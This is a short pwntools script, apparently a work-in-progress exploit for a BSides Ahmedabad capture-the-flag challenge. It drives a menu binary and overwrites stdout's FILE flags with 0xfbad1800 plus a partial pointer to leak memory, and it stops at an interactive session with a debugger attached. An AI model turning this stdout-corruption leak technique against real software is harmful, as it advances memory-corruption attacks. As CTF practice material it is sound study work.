from pwn import *

elf = ELF("./chall")
libc = elf.libc

target = process([elf.path])
#target = remote("pwn.bsidesahmedabad.in", 9090)

def sla(s, d):
	target.sendlineafter(s, str(d))

local_buf = 0
alloc_buf = 1
_dev_null = 2
to_stdout = 3
def send(choice, buffer):
	sla(b">", choice)
	if len(buffer) == 0x1f:
		target.sendafter(b">", buffer)
	else:
		sla(b">", buffer)

gdb.attach(target, 'p *stdout')

#send(local_buf, b"A"*0x19)
send(to_stdout, b"b")
send(alloc_buf, p64(0xfbad1800) + p64(0) + '\xff')
#send(_dev_null, b"b")
#send(to_stdout, b"b")

target.interactive()
